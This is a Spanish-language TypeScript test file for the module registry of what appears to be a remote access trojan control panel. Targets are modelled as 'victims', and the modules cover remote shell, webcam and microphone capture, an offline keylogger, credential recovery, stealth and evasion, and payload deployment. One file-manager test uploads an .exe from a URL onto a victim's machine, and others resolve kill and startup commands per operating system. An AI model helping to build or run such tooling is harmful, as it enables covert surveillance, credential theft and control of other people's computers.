import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  MODULE_CATEGORIES,
  MODULE_REGISTRY,
  moduleAvailability,
  resolveSteps,
  resultFileName,
  slugify,
  versionAtLeast
} from '../src/lib/modules';
import type { Victim } from '../src/lib/types';
import { validateParams } from '../server/lib/task-schemas';

const victim = (overrides: Partial<Victim> = {}): Victim => ({
  id: '11111111-1111-4111-8111-111111111111',
  hostname: 'ALFA',
  username: 'ana',
  os: 'Windows 10',
  osVersion: '10.0.19045',
  arch: 'x86_64',
  country: 'España',
  countryCode: 'ES',
  city: 'Madrid',
  lat: null,
  lon: null,
  tags: [],
  status: 'online',
  profile: 'full',
  agentVersion: '0.3.7',
  ip: '10.0.0.5',
  firstSeenAt: new Date().toISOString(),
  lastHeartbeatAt: new Date().toISOString(),
  online: true,
  socket: true,
  ...overrides
});

test('el registro tiene las 6 categorías y los 23 módulos del catálogo', () => {
  assert.equal(MODULE_CATEGORIES.length, 6);
  assert.equal(MODULE_REGISTRY.length, 23);
  assert.equal(new Set(MODULE_REGISTRY.map((entry) => entry.id)).size, 23);
  const counts = Object.fromEntries(MODULE_CATEGORIES.map((category) => [
    category.id,
    MODULE_REGISTRY.filter((entry) => entry.category === category.id).length
  ]));
  assert.deepEqual(counts, {
    'sesion-control': 5,
    'credenciales-recuperacion': 3,
    'sistema-archivos': 4,
    'captura-datos': 3,
    'sigilo-evasion': 5,
    'payload-despliegue': 3
  });
});

test('todos los módulos tienen etiqueta, descripción y estado ejecutable declarado', () => {
  for (const entry of MODULE_REGISTRY) {
    assert.ok(entry.label.length > 0, entry.id);
    assert.ok(entry.description.length > 0, entry.id);
    if (!entry.implemented) assert.equal(typeof entry.unsupportedReason, 'function', entry.id);
    if (entry.implemented && !['none', 'local'].includes(entry.kind)) {
      assert.ok(entry.task || entry.shellCommand || entry.agentCommand || entry.steps, entry.id);
    }
  }
});

test('ningún módulo soportado se oculta: la falta de socket solo lo atenúa', () => {
  const offline = victim({ socket: false });
  for (const entry of MODULE_REGISTRY) {
    const availability = moduleAvailability(entry, offline, []);
    if (entry.kind === 'local' || !entry.implemented) continue;
    assert.equal(availability.ok, false, entry.id);
    assert.ok(availability.reason, entry.id);
  }
});

test('resolveSteps respeta kind, input y timeout', () => {
  const shell = MODULE_REGISTRY.find((entry) => entry.id === 'remote-shell')!;
  assert.equal(resolveSteps(shell, victim(), 'whoami')[0]!.params.command, 'whoami');
  const tcp = MODULE_REGISTRY.find((entry) => entry.id === 'tcp-connections')!;
  assert.equal(resolveSteps(tcp, victim())[0]!.params.command, 'netstat -ano');
  const media = MODULE_REGISTRY.find((entry) => entry.id === 'webcam-mic')!;
  assert.equal(resolveSteps(media, victim()).length, 2);
  const keylogger = MODULE_REGISTRY.find((entry) => entry.id === 'offline-keylogger')!;
  assert.equal(resolveSteps(keylogger, victim(), 'dump')[0]!.params.command, 'dump');
});

test('el nombre de descarga es modulo_host_timestamp.ext', () => {
  const name = resultFileName(MODULE_REGISTRY[0]!, 'Mi PC/Ñ', 'txt');
  assert.match(name, /^remote_desktop_mi_pc_n_\d{8}t\d{6}\.txt$/i);
  assert.equal(slugify('Ñandú / 42'), 'nandu_42');
});

test('versionAtLeast compara componentes numéricos', () => {
  assert.equal(versionAtLeast('0.3.7', '0.3.7'), true);
  assert.equal(versionAtLeast('0.3.8', '0.3.7'), true);
  assert.equal(versionAtLeast('0.3.6', '0.3.7'), false);
  assert.equal(versionAtLeast(null, '0.3.7'), false);
});


test('todos los pasos resueltos pasan el validador del contrato', () => {
  for (const entry of MODULE_REGISTRY) {
    if (!entry.implemented || ['none', 'local'].includes(entry.kind)) continue;
    for (const step of resolveSteps(entry, victim())) {
      assert.equal(validateParams(step.name, step.params), null, `${entry.id}:${JSON.stringify(step.params)}`);
    }
  }
});


test('el gestor de archivos traduce la acción y la ruta al contrato', () => {
  const entry = MODULE_REGISTRY.find((item) => item.id === 'file-manager')!;
  assert.deepEqual(resolveSteps(entry, victim(), 'rename C:\\a.txt -> C:\\b.txt')[0]!.params, { action: 'rename', path: 'C:\\a.txt', to: 'C:\\b.txt' });
  assert.deepEqual(resolveSteps(entry, victim(), 'upload https://x/a.exe -> C:\\a.exe')[0]!.params, { action: 'upload', path: 'C:\\a.exe', url: 'https://x/a.exe' });
  assert.equal(resolveSteps(entry, victim(), '')[0]!.params.path, 'C:\\');
  assert.equal(validateParams('files', resolveSteps(entry, victim(), 'list C:\\')[0]!.params), null);
});

test('el gestor de procesos resuelve kill y startup por SO', () => {
  const entry = MODULE_REGISTRY.find((item) => item.id === 'process-manager')!;
  assert.equal(resolveSteps(entry, victim(), 'kill 42')[0]!.params.command, 'taskkill /PID 42 /F');
  assert.match(String(resolveSteps(entry, victim(), 'startup')[0]!.params.command), /Win32_StartupCommand/);
  assert.equal(resolveSteps(entry, victim({ os: 'Linux 6.1' }), 'kill 42')[0]!.params.command, 'kill -9 42');
});
